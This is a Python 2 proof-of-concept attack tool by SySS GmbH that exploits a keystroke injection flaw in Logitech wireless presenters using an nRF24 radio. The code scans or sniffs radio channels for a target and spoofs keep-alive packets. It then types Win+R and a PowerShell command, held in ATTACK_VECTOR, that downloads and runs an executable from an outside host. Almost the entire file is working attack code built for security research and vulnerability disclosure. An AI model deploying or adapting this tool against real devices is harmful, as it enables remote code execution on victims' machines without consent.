#!/usr/bin/env python2
# -*- coding: utf-8 -*-

"""
  Logitech Wireless Presenter Attack Tool

  by Matthias Deeg <matthias.deeg@syss.de>

  Proof-of-Concept software tool to demonstrate the keystroke injection
  vulnerability of Logitech wireless presenters

  Copyright (C) 2016 SySS GmbH

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

__version__ = '1.0'
__author__ = 'Matthias Deeg, Gerhard Klostermeier'

import argparse
import sys

from binascii import hexlify, unhexlify
from lib import nrf24, keyboard
from time import sleep, time

DWELL_TIME      = 0.1                       # dwell time for each channel in seconds
KEYSTROKE_DELAY = 0.01                      # keystroke delay in seconds
ATTACK_VECTOR   = u"powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"

# Logitech Unifying Keep Alive packet with 80 ms
# SET_KEEP_ALIVE = unhexlify("004F000370000000003E")
KEEP_ALIVE_80 = unhexlify("004003704D")
KEEP_ALIVE_TIMEOUT = 0.06


def banner():
    """Show a fancy banner"""

    print("        _____  ______ ___  _  _     _____  _                      _  \n"
"       |  __ \\|  ____|__ \\| || |   |  __ \\| |                    | |     \n"
"  _ __ | |__) | |__     ) | || |_  | |__) | | __ _ _   _ ___  ___| |_       \n"
" | '_ \\|  _  /|  __|   / /|__   _| |  ___/| |/ _` | | | / __|/ _ \\ __|    \n"
" | | | | | \\ \\| |     / /_   | |   | |    | | (_| | |_| \\__ \\  __/ |_   \n"
" |_| |_|_|  \\_\\_|    |____|  |_|   |_|    |_|\\__,_|\\__, |___/\\___|\\__|\n"
"                                                    __/ |             \n"
"                                                   |___/              \n"
"Logitech Wireless Presenter Attack Tool v{0} by Matthias Deeg - SySS GmbH (c) 2016".format(__version__))


# main program
if __name__ == '__main__':
    # show banner
    banner()

    # init argument parser
    parser = argparse.ArgumentParser()
    parser.add_argument('-a', '--address', type=str, help='Address of nRF24 device')
    parser.add_argument('-c', '--channels', type=int, nargs='+', help='ShockBurst RF channel', default=range(2, 84), metavar='N')

    # parse arguments
    args = parser.parse_args()

    # set scan channels
    scan_channels = args.channels

    if args.address:
        try:
            # address of nRF24 presenter (CAUTION: Reversed byte order compared to sniffer tools!)
            # TODO: Check address length. Must be 5 bytes.
            address = args.address.replace(':', '').decode('hex')[::-1][:5]
            address_string = ':'.join('{:02X}'.format(ord(b)) for b in address)
        except:
            print("[-] Error: Invalid address")
            exit(1)
    else:
        address = ""

     # initialize keyboard for Logitech Presenter (for example Logitech R400)
    kbd = keyboard.LogitechPresenter()

    # initialize radio
    print("[*] Configure nRF24 radio")
    radio = nrf24.nrf24()

    # enable LNA
    radio.enable_lna()

    # set the initial channel
    radio.set_channel(scan_channels[0])

    # put the radio in promiscuous mode (without address) or into
    # sniffer mode(with address)
    if len(address) > 0:
        radio.enter_sniffer_mode(address)
    else:
        radio.enter_promiscuous_mode()

    channel_index = 0
    if len(address) > 0:
        # actively search for the given address
        print("[*] Actively searching for address {}".format(address_string))
        last_ping = time()

        # init variables with default values from nrf24-sniffer.py
        timeout = 0.1
        ping_payload = unhexlify('0F0F0F0F')
        ack_timeout = 250 # range: 250-40000, steps: 250
        ack_timeout = int(ack_timeout / 250) - 1
        retries = 1 # range: 0-15
        while True:
            # follow the target device if it changes channels
            if time() - last_ping > timeout:
                # first try pinging on the active channel
                if not radio.transmit_payload(ping_payload, ack_timeout, retries):
                    # ping failed on the active channel, so sweep through all available channels
                    success = False
                    for channel_index in range(len(scan_channels)):
                        radio.set_channel(scan_channels[channel_index])
                        if radio.transmit_payload(ping_payload, ack_timeout, retries):
                            # ping successful, exit out of the ping sweep
                            last_ping = time()
                            print("[*] Ping success on channel {0}".format(scan_channels[channel_index]))
                            success = True
                            break
                    # ping sweep failed
                    if not success:
                        print("[*] Unable to ping {0}".format(address_string))
                # ping succeeded on the active channel
                else:
                  print("[*] Ping success on channel {0}".format(scan_channels[channel_index]))
                  last_ping = time()

            # receive payloads
            value = radio.receive_payload()
            if value[0] == 0:
                # reset the channel timer
                last_ping = time()
                # split the payload from the status byte
                payload = value[1:]
                if len(payload) >= 5:
                    break;
    else:
        # sweep through the channels and decode ESB packets in pseudo-promiscuous mode
        print("[*] Scanning for Logitech wireless presenter ...")
        last_tune = time()
        while True:
            # increment the channel
            if len(scan_channels) > 1 and time() - last_tune > DWELL_TIME:
                channel_index = (channel_index + 1) % (len(scan_channels))
                radio.set_channel(scan_channels[channel_index])
                last_tune = time()

            # receive payloads
            value = radio.receive_payload()
            if len(value) >= 5:
                # split the address and payload
                address, payload = value[0:5], value[5:]

                # convert address to string and reverse byte order
                converted_address = address[::-1].tostring()
                address_string = ':'.join('{:02X}'.format(b) for b in address)
                print("[+] Found nRF24 device with address {0} on channel {1}".format(address_string, scan_channels[channel_index]))

                # ask user about device
                answer = raw_input("[?] Attack this device (y/n)? ")
                if answer[0] == 'y':
                    # put the radio in sniffer mode (ESB w/o auto ACKs)
                    radio.enter_sniffer_mode(converted_address)
                    break
                else:
                    print("[*] Continue scanning ...")

    print("[*] Press <CTRL+C> to start keystroke injection")
    while True:
        try:
            radio.transmit_payload(KEEP_ALIVE_80)
            sleep(KEEP_ALIVE_TIMEOUT)
        except:
            break

    print("\n[*] Start keystroke injection ...")

    # send keystrokes for a classic download and execute PoC attack
    keystrokes = []
    keystrokes.append(kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
    keystrokes.append(kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
    keystrokes.append(kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))

    # send attack keystrokes
    for k in keystrokes:
        radio.transmit_payload(k)
        radio.transmit_payload(KEEP_ALIVE_80)
        sleep(KEYSTROKE_DELAY)

    # need small delay after WIN + R
    sleep(0.1)

    keystrokes = []
    keystrokes = kbd.getKeystrokes(ATTACK_VECTOR)
    keystrokes += kbd.getKeystroke(keyboard.KEY_RETURN)

    # send attack keystrokes with a small delay
    for k in keystrokes:
        radio.transmit_payload(k)
        radio.transmit_payload(KEEP_ALIVE_80)
        sleep(KEYSTROKE_DELAY)

    print("[*] Done.")

